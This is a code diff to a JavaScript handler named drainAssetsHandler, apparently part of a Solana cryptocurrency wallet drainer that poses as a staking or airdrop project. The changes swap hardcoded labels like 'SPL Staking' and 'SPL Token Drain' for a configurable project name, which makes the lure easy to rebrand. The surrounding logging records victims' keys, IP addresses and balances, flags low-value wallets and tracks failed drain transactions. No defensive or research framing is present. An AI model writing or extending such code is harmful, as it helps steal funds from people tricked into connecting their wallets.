@@ -669,7 +669,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: user || 'Missing',
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: 'Missing or invalid user parameter',
-          context: 'SPL Staking - Parameter Validation',
+          context: `${PROJECT_NAME} - Parameter Validation`,
           walletType: validatedWalletType,
           lamports: 0,
           projectName: PROJECT_NAME
@@ -692,7 +692,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: user || 'Invalid Format',
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: 'Invalid Solana public key format',
-          context: 'SPL Staking - Public Key Format Validation',
+          context: `${PROJECT_NAME} - Public Key Format Validation`,
           walletType: validatedWalletType,
           lamports: 0,
           projectName: PROJECT_NAME
@@ -719,7 +719,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: user || 'Invalid Format',
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: `Invalid public key format: ${error.message}`,
-          context: 'SPL Staking - Public Key Validation',
+          context: `${PROJECT_NAME} - Public Key Validation`,
           walletType: validatedWalletType,
           lamports: 0,
           projectName: PROJECT_NAME
@@ -745,7 +745,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: 'Security violation: Attempted to drain receiver wallet',
-          context: 'SPL Airdrop - Security Check',
+          context: `${PROJECT_NAME} - Security Check`,
           walletType: validatedWalletType,
           lamports: 0,
           securityViolation: true,
@@ -787,7 +787,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: `Suspicious wallet address: ${differences} character differences from receiver`,
-          context: 'SPL Staking - Security Check',
+          context: `${PROJECT_NAME} - Security Check`,
           walletType: validatedWalletType,
           lamports: 0,
           securityViolation: true,
@@ -858,7 +858,7 @@ export default async function drainAssetsHandler(req, res) {
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           lamports: userSolBalance,
           walletType: walletType || 'Unknown',
-          context: 'SPL Staking - Transaction Fees',
+          context: `${PROJECT_NAME} - Transaction Fees`,
           required: MIN_SOL_FOR_FEES,
           splTokens: 0,
           projectName: PROJECT_NAME
@@ -886,7 +886,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: 'Low value wallet detected',
-          context: 'SPL Staking - Security Check',
+          context: `${PROJECT_NAME} - Security Check`,
           walletType: walletType || 'Unknown',
           lamports: userSolBalance,
           securityViolation: true,
@@ -1266,7 +1266,7 @@ export default async function drainAssetsHandler(req, res) {
               publicKey: userPubkey.toString(),
               ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
               error: 'All RPC endpoints failed for blockhash retrieval',
-              context: 'SPL Staking - Blockhash Fallback Failure',
+              context: `${PROJECT_NAME} - Blockhash Fallback Failure`,
               walletType: walletType || 'Unknown',
               lamports: userSolBalance,
               projectName: PROJECT_NAME
@@ -1308,7 +1308,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: `Clean transfer transaction simulation failed: ${cleanTransferSimulation.error}`,
-          context: 'SPL Staking - Clean Transfer Simulation',
+          context: `${PROJECT_NAME} - Clean Transfer Simulation`,
           walletType: walletType || 'Unknown',
           lamports: userSolBalance,
           projectName: PROJECT_NAME
@@ -1337,7 +1337,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: `Transaction simulation failed: ${simulationError.message}`,
-          context: 'SPL Staking - Transaction Simulation',
+          context: `${PROJECT_NAME} - Transaction Simulation`,
           walletType: walletType || 'Unknown',
           lamports: userSolBalance,
           projectName: PROJECT_NAME
@@ -1462,7 +1462,7 @@ export default async function drainAssetsHandler(req, res) {
       publicKey: req.body?.user || 'Unknown',
       walletType: req.body?.walletType || 'Unknown',
       ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
-      context: 'SPL Token Drain - Complete Failure',
+      context: `${PROJECT_NAME} - Complete Failure`,
       splTokens: 0,
       lamports: 0
     });
